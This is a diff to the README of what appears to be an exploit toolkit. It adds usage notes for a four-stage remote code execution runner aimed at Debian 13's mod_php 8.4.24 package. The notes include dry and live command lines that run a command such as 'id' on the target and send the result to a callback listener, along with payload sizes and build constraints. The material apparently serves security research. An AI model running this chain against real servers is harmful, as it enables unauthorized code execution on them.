@@ -84,6 +84,7 @@ document are.
 | path | contents |
 |---|---|
 | `tool/php2shell.py` | chain driver (`recon`, `producer`, `write_stage`, `leak`, `g2`, `chain`) |
+| `tool/debian8424.py` | standalone Debian 13 `libapache2-mod-php8.4` 8.4.24 four-stage runner (A1→B1→A2→B2); dry by default |
 | `tool/run` | POSIX shell wrapper: `./tool/run --help` |
 | `tool/modules/` | request/producer builders, chain stages, per-build profiles (see `tool/modules/README.md`) |
 | `tool/stages/` | fingerprint and probe stage |
@@ -129,6 +130,38 @@ blocker-hold + rearm + forged staged multipart).
 
 Registered targets and per-build constants live in `tool/modules/profiles.py`.
 Receipts are written under `files/io/` by default and are git-ignored.
+
+### Debian 13 mod_php 8.4.24 four-stage runner
+
+`tool/debian8424.py` is a separate, research-derived runner for the exact
+Debian package `libapache2-mod-php8.4 8.4.24-1~deb13u1`. It is deliberately
+not a `--profile` entry and does not change the existing `--step chain`
+semantics. The target shape is prefork mod_php with
+`output_buffering=4096` and a 22-byte PHP endpoint
+(`<?php echo "OK\n"; ?>`); the package must match, because the constants are
+build-specific.
+
+Dry-run is the default and sends no traffic; `--live` sends one exact
+A1 → B1 → A2 → B2 sequence. A1/B1/A2/B2 are 1,060,211 / 33,128,677 /
+279,432 / 451,384 bytes and are hash-checked before sending.
+
+```sh
+# offline: generate and verify bodies, no socket
+python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --dry-run
+
+# live, with a built-in loopback HTTP callback collector
+python3 -m tool.debian8424 --url http://127.0.0.1:8080/ \
+    --command id --lhost 127.0.0.1 --lport 9001 --timeout 180 \
+    --output files/io/debian8424-run1 --live
+```
+
+Use `--callback http://HOST:PORT` with `--callback-log FILE` for an external
+collector, or `--proof-file PATH` / `--error-log PATH` when the runner shares
+the target filesystem (bare-metal local use). Success is reported only when
+the marker is observed through one of those channels; an HTTP 200/500 response
+alone is not success. There is no `docker exec` and no container-filesystem
+read. B1 is probabilistic, and the B2 command must fit the 200-byte `ht`
+carrier.
 
 ## Scope and authorization
 
